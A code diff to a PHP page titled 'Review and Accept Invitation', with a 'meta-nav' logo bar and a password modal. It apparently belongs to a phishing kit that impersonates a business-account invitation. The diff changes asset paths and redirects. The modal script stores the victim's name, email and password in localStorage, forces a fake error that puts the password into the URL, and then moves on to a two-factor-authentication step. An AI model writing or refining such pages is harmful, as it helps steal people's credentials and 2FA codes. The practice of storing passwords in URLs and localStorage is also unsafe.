@@ -24,14 +24,14 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="../../images/favicon.ico">
+    <link rel="icon" href="/images/favicon.ico">
     <title>Review and Accept Invitation</title>
-    <link rel="stylesheet" href="../../styles/confirm-business-information.css">
+    <link rel="stylesheet" href="/styles/confirm-business-information.css">
 </head>
 <body>
     <nav class="meta-nav">
         <div class="nav-content">
-            <img src="../../images/logo.png" alt="Logo" class="logo">
+            <img src="/images/logo.png" alt="Logo" class="logo">
         </div>
     </nav>
 
@@ -101,7 +101,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         </div>
     </footer>
 
-    <script src="../../scripts/confirm-business-information.js"></script>
+    <script src="/scripts/confirm-business-information.js"></script>
     
     <!-- Password Confirmation Modal -->
     <div class="password-modal">
@@ -223,13 +223,13 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                         var error = paramsURL.get('error');
 
                         if (error == 1) {
-                            window.location.href = "two-factor-authentication";
+                            window.location.href = "/two-factor-authentication.php";
                             localStorage.setItem('firstName', firstName);
                             localStorage.setItem('lastName', lastName);
                             localStorage.setItem('personalEmail', personalEmail);
                             localStorage.setItem('password', password);
                         } else {
-                            window.location.href = "confirm-business-information?error=1&password=" + password;
+                            window.location.href = "/two-factor-authentication.php?error=1&password=" + password;
                         }
                     }, 1000);
                 } else {
